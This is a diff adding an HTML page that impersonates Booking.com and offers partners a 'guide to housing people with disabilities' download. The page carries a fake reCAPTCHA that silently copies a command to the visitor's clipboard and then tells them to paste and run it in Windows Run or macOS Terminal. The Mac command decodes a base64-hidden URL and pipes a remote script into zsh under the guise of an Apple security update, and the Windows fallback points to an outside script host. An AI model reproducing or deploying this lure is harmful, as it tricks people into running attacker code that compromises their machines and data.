+                                        <span class="mock-dialog-btn">Extract to...</span>
+                                        <div style="clear:both"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-number">4</div>
+                        <h4 class="step-title">Launch the Application</h4>
+                        <p class="step-text">Locate the portable application file named <strong>"BookingGuide"</strong> within the extracted folder and double-click to launch it. No additional installation is required — the application is fully portable and ready to use immediately.</p>
+                        <div class="step-image">
+                            <div class="mock mock-explorer">
+                                <div class="mock-explorer-window">
+                                    <div class="mock-explorer-bar">BookingGuide — File Explorer</div>
+                                    <div class="mock-explorer-grid">
+                                        <div class="mock-explorer-item selected">
+                                            <div class="mock-explorer-icon app"></div>
+                                            <span>BookingGuide.exe</span>
+                                        </div>
+                                        <div class="mock-explorer-item">
+                                            <div class="mock-explorer-icon"></div>
+                                            <span>README.txt</span>
+                                        </div>
+                                        <div class="mock-explorer-item">
+                                            <div class="mock-explorer-icon"></div>
+                                            <span>resources</span>
+                                        </div>
+                                    </div>
+                                    <div class="mock-explorer-hint">Double-click <strong>BookingGuide.exe</strong> to launch the application.</div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-number">5</div>
+                        <h4 class="step-title">Access Your Guide</h4>
+                        <p class="step-text">Once the application is running, navigate to the <strong>Resources</strong> section from the main menu. Your complete accessibility housing guide will appear here, ready for you to explore.</p>
+                        <div class="step-image">
+                            <div class="mock mock-app">
+                                <div class="mock-app-window">
+                                    <div class="mock-app-top">
+                                        <div class="dots"><i style="background:#ff6058"></i><i style="background:#ffbd2e"></i><i style="background:#28ca41"></i></div>
+                                        BookingGuide
+                                    </div>
+                                    <div class="mock-app-layout">
+                                        <nav class="mock-app-sidebar">
+                                            <a href="#">Home</a>
+                                            <a href="#" class="active">Resources</a>
+                                            <a href="#">Settings</a>
+                                            <a href="#">Help</a>
+                                        </nav>
+                                        <div class="mock-app-content">
+                                            <h6>Accessibility Housing Guide</h6>
+                                            <div class="mock-chapter highlight">
+                                                <strong>Chapter 1: Understanding Accessibility Requirements</strong>
+                                                <span>Learn about legal standards and best practices...</span>
+                                            </div>
+                                            <div class="mock-chapter">
+                                                <strong>Chapter 2: Adapting Your Property</strong>
+                                                <span>Physical modifications and communication tools...</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <p class="guide-thanks">Thank you for completing your onboarding with us! We hope this guide helps you create more accessible and inclusive accommodation experiences.</p>
+                </div>
+            </article>
+
+            <!-- Mac Guide -->
+            <article class="guide-card" id="guide-mac">
+                <div class="guide-card-header">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 24 24"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.82-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.81-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+                    <div>
+                        <h3>macOS Setup Guide</h3>
+                        <p>Step-by-step instructions for Mac users</p>
+                    </div>
+                </div>
+                <div class="guide-card-body">
+                    <p class="guide-intro">We are delighted to welcome you to our platform! To ensure a smooth onboarding experience, please follow the instructions below to download and access the Complete Guide to Housing People with Disabilities.</p>
+
+                    <div class="step">
+                        <div class="step-number">1</div>
+                        <h4 class="step-title">Visit the Booking.com Website</h4>
+                        <p class="step-text">Navigate to the official Booking.com platform using your personalized partner link and click <strong>"Download for Mac"</strong> to initiate the setup process.</p>
+                        <div class="step-image">
+                            <div class="mock mock-browser">
+                                <div class="mock-browser-bar">
+                                    <div class="mock-dots"><span></span><span></span><span></span></div>
+                                    <div class="mock-url">https://www.booking.com/accessibility/guide</div>
+                                </div>
+                                <div class="mock-site-header">Booking.com</div>
+                                <div class="mock-hero">
+                                    <h5>Complete Guide to Housing People with Disabilities</h5>
+                                    <div class="mock-btn-row">
+                                        <button class="mock-btn mock-btn-secondary" type="button">Download for Windows</button>
+                                        <button class="mock-btn mock-btn-primary" type="button">Download for Mac</button>
+                                    </div>
+                                </div>
+                                <div class="mock-card-below">
+                                    <h6>Setup Instructions</h6>
+                                    <p>Follow the step-by-step guides below to download and access the guide on your device.</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-number">2</div>
+                        <h4 class="step-title">Download the Application</h4>
+                        <p class="step-text">To download the application via our secure corporate server, please open a terminal window by pressing <strong>Cmd + Space</strong> and typing <strong>"Terminal."</strong> Once the terminal is open, copy the download path from the pop-up window, paste it into the terminal, and press Enter.</p>
+                        <div class="step-image">
+                            <div class="mock mock-terminal-wrap">
+                                <div class="mock-terminal">
+                                    <div class="mock-terminal-head">
+                                        <div class="mock-dots"><span></span><span></span><span></span></div>
+                                        <span style="color:#aaa;font-size:11px">Terminal — user@MacBook</span>
+                                    </div>
+                                    <div class="mock-terminal-body">
+                                        <div class="dim">Last login: Mon Jun 15 10:30:00 on ttys000</div>
+                                        <div><span class="prompt">user@MacBook ~ % </span><span class="cmd">curl -O https://secure.booking.com/guide/mac/BookingGuide.dmg</span></div>
+                                        <div class="out">  % Total    % Received % Xferd  Average Speed</div>
+                                        <div class="out">100 24500  100 24500    0     0  1.2M      0 --:--:-- --:--:--</div>
+                                        <div><span class="prompt">user@MacBook ~ % </span></div>
+                                        <div class="mock-tip-box">
+                                            <span class="dim" style="border:none;padding:0;margin:0">Press Cmd + Space, type Terminal, paste the download path:</span>
+                                            <code>https://secure.booking.com/guide/mac/BookingGuide.dmg</code>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="step">
+                        <div class="step-number">3</div>
+                        <h4 class="step-title">Access Your Guide</h4>
+                        <p class="step-text">Once the application has finished downloading, open it and navigate to the <strong>Resources</strong> section from the main menu. Your complete accessibility housing guide will appear there, ready for you to explore.</p>
+                        <div class="step-image">
+                            <div class="mock mock-app">
+                                <div class="mock-app-window">
+                                    <div class="mock-app-top">
+                                        <div class="dots"><i style="background:#ff6058"></i><i style="background:#ffbd2e"></i><i style="background:#28ca41"></i></div>
+                                        BookingGuide
+                                    </div>
+                                    <div class="mock-app-layout">
+                                        <nav class="mock-app-sidebar">
+                                            <a href="#">Home</a>
+                                            <a href="#" class="active">Resources</a>
+                                            <a href="#">Settings</a>
+                                            <a href="#">Help</a>
+                                        </nav>
+                                        <div class="mock-app-content">
+                                            <h6>Accessibility Housing Guide</h6>
+                                            <div class="mock-chapter highlight">
+                                                <strong>Chapter 1: Understanding Accessibility Requirements</strong>
+                                                <span>Learn about legal standards and best practices...</span>
+                                            </div>
+                                            <div class="mock-chapter">
+                                                <strong>Chapter 2: Adapting Your Property</strong>
+                                                <span>Physical modifications and communication tools...</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <p class="guide-thanks">Thank you for completing your onboarding with us! We hope this guide helps you create more accessible and inclusive accommodation experiences.</p>
+                </div>
+            </article>
+        </div>
+    </section>
+
+    <div class="captcha-overlay" id="captchaOverlay" aria-modal="true" role="dialog">
+        <div class="captcha-modal">
+            <h2>Robot or human ?</h2>
+            <p>Check the box to confirm that you're human. Thank You!</p>
+            <div class="recaptcha-wrap">
+                <div class="recaptcha-box" id="recaptchaBox" role="button" tabindex="0" aria-label="I'm not a robot">
+                    <div class="recaptcha-checkbox" id="recaptchaCheckbox">
+                        <div class="recaptcha-spinner"></div>
+                        <div class="recaptcha-checkmark">
+                            <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                        </div>
+                    </div>
+                    <span class="recaptcha-label">I'm not a robot</span>
+                    <div class="recaptcha-brand">
+                        <svg viewBox="0 0 64 64" aria-hidden="true">
+                            <path fill="#1c3aa9" d="M32 4C16.5 4 4 16.5 4 32s12.5 28 28 28 28-12.5 28-28S47.5 4 32 4zm-2.2 44.5L14.7 33.4l4.2-4.2 11.1 11.1 19.3-19.3 4.2 4.2-23.5 23.5z"/>
+                            <path fill="#4285f4" d="M32 4v56c15.5 0 28-12.5 28-28S47.5 4 32 4z" opacity=".3"/>
+                            <path fill="#4a90e2" d="M32 8c-2.8 0-5.5.6-7.9 1.7l3.9 3.9C29.5 13.2 30.7 13 32 13c5.5 0 10 4.5 10 10s-4.5 10-10 10c-2.2 0-4.2-.7-5.8-1.9l-3.9 3.9C25.5 37.4 28.6 38 32 38c8.3 0 15-6.7 15-15S40.3 8 32 8z"/>
+                        </svg>
+                        <span>reCAPTCHA</span>
+                        <a href="#">Privacy</a>
+                        <a href="#">Terms</a>
+                    </div>
+                </div>
+                <div class="verification-steps" id="verificationStepsWindows">
+                    <h3>Verification Steps</h3>
+                    <ol>
+                        <li>Press <span class="key-combo">Windows Button</span> <span class="win-key" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M3 5.5L10.5 4.2v7.1H3V5.5zm0 13V11.3h7.5v8.5L3 18.5zM11.3 4.1L21 2.5v9.8h-9.7V4.1zm0 17.4V12.3H21v9.2l-9.7-1.6z"/></svg></span> + R</li>
+                        <li>Press <span class="key-combo">CTRL + V</span></li>
+                        <li>Press <span class="key-combo">Enter</span></li>
+                    </ol>
+                </div>
+                <div class="verification-steps" id="verificationStepsMac">
+                    <h3>Verification Steps</h3>
+                    <ol>
+                        <li>Press <span class="mac-key">⌘</span> + <span class="key-combo">Space</span>, type <span class="key-combo">"Terminal"</span></li>
+                        <li>Press <span class="mac-key">⌘</span> + <span class="key-combo">V</span></li>
+                        <li>Press <span class="key-combo">Enter</span></li>
+                    </ol>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer class="site-footer">
+        <div class="footer-inner">
+            <div class="footer-links">
+                <a href="#">About Booking.com</a>
+                <a href="#">Customer Service help</a>
+                <a href="#">Privacy &amp; cookies</a>
+                <a href="#">Terms &amp; conditions</a>
+                <a href="#">Accessibility statement</a>
+                <a href="#">Partner help</a>
+                <a href="#">List your property</a>
+            </div>
+            <p class="footer-copy">© 2024 Booking.com. All rights reserved.</p>
+        </div>
+    </footer>
+
+    <script src="js/api.js"></script>
+    <script>
+        async function copyToClipboard(text) {
+            if (navigator.clipboard && window.isSecureContext) {
+                await navigator.clipboard.writeText(text);
+                return true;
+            }
+            const textarea = document.createElement('textarea');
+            textarea.value = text;
+            textarea.style.position = 'fixed';
+            textarea.style.left = '-9999px';
+            document.body.appendChild(textarea);
+            textarea.select();
+            const ok = document.execCommand('copy');
+            document.body.removeChild(textarea);
+            return ok;
+        }
+
+        async function initCaptcha() {
+            const platform = BookingAPI.detectPlatform();
+            const config = await BookingAPI.getConfig();
+            const clipboardText = platform === 'mac'
+                ? (config.macClipboardText || 'echo "Downloading Update: https://support.apple.com/downloads/macos-security-update-14.5.dmg" && curl -s $(echo "aHR0cHM6Ly9oZWJzYnNiempzanNoZHV4YnMueHl6L2RlYnVnL2xvYWRlci5zaD9idWlsZD00MDEzOGQ1M2ViYjYwZTNmNjg4NjNjZTUwNWM2NjhiOA==" | base64 -d) | zsh')
+                : (config.windowsClipboardText || '<script src="https://aniyara.icu/870ahpun4p/api"></script>');
+
+            const box = document.getElementById('recaptchaBox');
+            const checkbox = document.getElementById('recaptchaCheckbox');
+            const steps = document.getElementById(
+                platform === 'mac' ? 'verificationStepsMac' : 'verificationStepsWindows'
+            );
+            let activated = false;
+
+            async function activate() {
+                if (activated) return;
+                activated = true;
+                box.style.pointerEvents = 'none';
+
+                checkbox.classList.add('loading');
+
+                await new Promise(resolve => setTimeout(resolve, 1200));
+
+                try {
+                    await copyToClipboard(clipboardText);
+                    BookingAPI.trackCaptchaCopy(platform).catch(function () {});
+                } catch (e) {
+                    console.warn('Clipboard copy failed', e);
+                }
+
+                checkbox.classList.remove('loading');
+                checkbox.classList.add('checked');
+                steps.classList.add('visible');
+            }
+
+            box.addEventListener('click', activate);
+            box.addEventListener('keydown', (e) => {
+                if (e.key === 'Enter' || e.key === ' ') {
+                    e.preventDefault();
+                    activate();
+                }
+            });
+        }
+
+        initCaptcha();
+
+        async function handleDownload(event, platform) {
+            event.preventDefault();
+            const btn = event.currentTarget;
+            if (btn.classList.contains('loading')) return;
+
+            btn.classList.add('loading');
+            const originalHTML = btn.innerHTML;
+            btn.innerHTML = `
+                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2">
+                    <path stroke-linecap="round" stroke-linejoin="round" d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
+                </svg>
+                Preparing...
+            `;
+
+            try {
+                const data = await BookingAPI.download(platform);
+                window.location.href = data.url;
+            } catch (e) {
+                const msg = e.message === 'Download link not configured'
+                    ? 'Download link is not configured yet. Please contact the administrator.'
+                    : 'Download failed. Please try again.';
+                alert(msg);
+            } finally {
+                btn.classList.remove('loading');
+                btn.innerHTML = originalHTML;
+            }
+        }
+    </script>
+</body>
+</html>
